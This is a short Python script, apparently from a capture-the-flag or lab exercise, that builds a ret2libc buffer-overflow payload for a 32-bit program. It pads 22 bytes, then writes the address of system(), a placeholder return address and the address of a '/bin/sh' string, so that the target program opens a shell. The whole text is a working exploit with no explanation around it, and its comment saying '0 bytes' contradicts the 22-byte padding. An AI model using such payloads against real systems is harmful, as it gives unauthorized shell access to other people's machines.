import sys

# 0 bytes to reach eip
padding = b"A" * 22

system_addr = (0x08051520).to_bytes(4, "little")
temp_ret    = (0xDEADBEEF).to_bytes(4, "little")
bin_sh_addr = (0x080b884d).to_bytes(4, "little")

payload = padding + system_addr + temp_ret + bin_sh_addr
sys.stdout.buffer.write(payload)